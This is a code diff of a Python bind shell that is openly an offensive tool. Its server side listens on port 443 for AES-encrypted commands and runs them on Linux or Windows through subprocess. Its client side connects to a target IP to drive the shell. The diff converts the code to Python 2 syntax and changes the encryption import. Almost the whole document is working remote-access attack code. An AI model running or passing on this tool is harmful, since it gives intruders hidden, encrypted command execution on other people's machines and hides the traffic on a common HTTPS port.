@@ -1,24 +1,22 @@
 import sys
+import time
 import socket
 import argparse
 import platform
 import threading
 import subprocess
 
-from aes_pycryptodome import AESCipher
-
-DEFAULT_PORT = 443
-MAX_BUFFER = 4096
+from aes import AES
 
 class BindShell:
     def __init__(self):
-        self.aes = AESCipher()
+        self.aes = AES()
 
-    def encrypted_send(self, s, msg):
+    def encrypted_send(self, s, message):
         """Send an AES-encrypted message."""
 
-        encrypted = self.aes.encrypt(msg)
-        s.send(encrypted.encode('latin-1'))
+        encrypted = self.aes.encrypt(message)
+        s.send(encrypted)
 
     def execute_cmd(self, cmd):
         """Execute a Linux/Windows command."""
@@ -27,21 +25,17 @@ class BindShell:
             try:
                 output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
             except:
-                output = b'Command failed.'
+                output = 'Command failed.'
         elif platform.system() == 'Windows':
             try:
-                output = subprocess.check_output(f"cmd /c {cmd}", stderr=subprocess.STDOUT)
+                output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
             except:
-                output = b'Command failed.'
+                output = 'Command failed.'
         else:
-            print('The system must be Linux or Windows. Terminating...')
+            print 'The system must be Linux or Windows. Terminating...'
             sys.exit()
         
         return output
-
-    def decode_and_strip(self, s):
-        """Decode and strip the string."""
-        return s.decode('latin-1').strip()
 
     def cleanup(self, s):
         """Close the socket and exit the program."""
@@ -51,78 +45,81 @@ class BindShell:
     def shell_thread(self, s):
         """Multithreading interactive shell sesion."""
         if platform.system() == 'Linux':
-            self.encrypted_send(s, b"[ -- Connected -- ]\n")
+            self.encrypted_send(s, "[ -- Connected -- ]\n")
         elif platform.system() == 'Windows':
-            self.encrypted_send(s, b"[ -- Connected -- ]\r\n")
+            self.encrypted_send(s, "[ -- Connected -- ]\r\n")
         else:
-            print('The system must be Linux or Windows. Terminating...')
+            print 'The system must be Linux or Windows. Terminating...'
             sys.exit()
 
         try:
             while True:
                 if platform.system() == 'Linux':
-                    self.encrypted_send(s, b"\nEnter command>")
+                    self.encrypted_send(s, "\nEnter command>")
                 elif platform.system() == 'Windows':
-                    self.encrypted_send(s, b"\r\nEnter command>")
+                    self.encrypted_send(s, "\r\nEnter command>")
                 else:
-                    print('The system must be Linux or Windows. Terminating...')
+                    print 'The system must be Linux or Windows. Terminating...'
                     sys.exit()
 
-                data = s.recv(MAX_BUFFER)
-                if data:
-                    buffer = self.aes.decrypt(self.decode_and_strip(data))
-                    buffer = self.decode_and_strip(buffer)
+                data = s.recv(4096)
 
-                    if not buffer or buffer == 'exit':
+                if data:
+                    decrypted = self.aes.decrypt(data)
+
+                    if not decrypted or decrypted.strip() == 'exit':
                         self.cleanup(s)
 
-                    print(f"> Executing command: '{buffer}'")
-                    self.encrypted_send(s, self.execute_cmd(buffer))
+                    print "> Executing command: '{}'".format(decrypted)
+                    command_result = self.execute_cmd(decrypted)
+                    self.encrypted_send(s, command_result)
         except:
-            print("shell_thread error. Terminating...")
+            print 'shell_thread error. Terminating...'
             self.cleanup(s)
 
     def send_thread(self, s):
         """Multithreading send()."""
         try:
             while True:
-                data = input() + '\n'
-                self.encrypted_send(s, data.encode('latin-1'))
+                input_data = raw_input() + '\n'
+                self.encrypted_send(s, input_data)
         except:
-            print('send_thread error. Terminating...')
+            print 'send_thread error. Terminating...'
             self.cleanup(s)
 
     def recv_thread(self, s):
         """Multithreading recv()."""
         try:
             while True:
-                data = self.decode_and_strip(s.recv(MAX_BUFFER))
+                data = s.recv(4096)
 
                 if data:
-                    data = self.aes.decrypt(data).decode('latin-1')
-                    print(data, end='', flush=True)
+                    decrypted = self.aes.decrypt(data)
+                    print decrypted
+                else:
+                    break
         except:
-            print('recv_thread error. Terminating...')
+            print 'recv_thread error. Terminating...'
             self.cleanup(s)
 
     def server(self):
         """Socket server."""
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('0.0.0.0', DEFAULT_PORT))
-        s.listen()
+        s.bind(('0.0.0.0', 443))
+        s.listen(5)
 
-        print('[ -- Starting Bind Shell -- ]')
+        print '[ -- Starting Bind Shell -- ]'
         while True:
             client_socket, addr = s.accept()
-            print('[ -- New User Connected -- ]')
+            print '[ -- New User Connected -- ]'
             threading.Thread(target=self.shell_thread, args=(client_socket,)).start()
 
     def client(self, ip):
         """Socket client."""
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, DEFAULT_PORT))
+        s.connect((ip, 443))
 
-        print('[ -- Connecting to Bind Shell -- ]')
+        print '[ -- Connecting to Bind Shell -- ]'
         threading.Thread(target=self.send_thread, args=(s,)).start()
         threading.Thread(target=self.recv_thread, args=(s,)).start()
 
